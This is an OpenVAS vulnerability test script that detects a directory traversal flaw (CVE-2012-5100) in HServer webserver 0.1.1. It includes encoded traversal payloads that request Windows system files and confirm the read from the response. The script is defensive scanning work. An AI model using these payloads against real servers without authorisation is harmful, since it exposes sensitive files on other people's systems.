###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hserver_webserver_mult_dir_trav_vuln.nasl 12092 2018-10-25 11:43:33Z cfischer $
#
# HServer Multiple Webserver Directory Traversal Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802410");
  script_version("$Revision: 12092 $");
  script_cve_id("CVE-2012-5100");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-25 13:43:33 +0200 (Thu, 25 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-01-06 13:10:29 +0530 (Fri, 06 Jan 2012)");
  script_name("HServer Webserver Multiple Directory Traversal Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/521119");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108376/hserverwebserver-traversal.txt");
  script_xref(name:"URL", value:"https://github.com/lpicanco/hserver");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 8081);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("Host/runs_windows");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"HServer webserver version 0.1.1");

  script_tag(name:"insight", value:"The flaws are due to improper validation of URI containing
  '..\..\' sequences, which allows attackers to read arbitrary files via directory traversal attacks.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running HServer Webserver and is prone to multiple
  directory traversal vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("misc_func.inc");

# nb: hServer is not sending any "Server:" banner
port = get_http_port( default:8081 );

files = traversal_files( "Windows" );

exploits = make_list("/..%5c..%5c..%5c", "/%2e%2e%5c%2e%2e%5c%2e%2e%5c");

foreach exploit( exploits ) {

  foreach pattern( keys( files ) ) {

    file = files[pattern];
    url = exploit + file;

    if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 0 );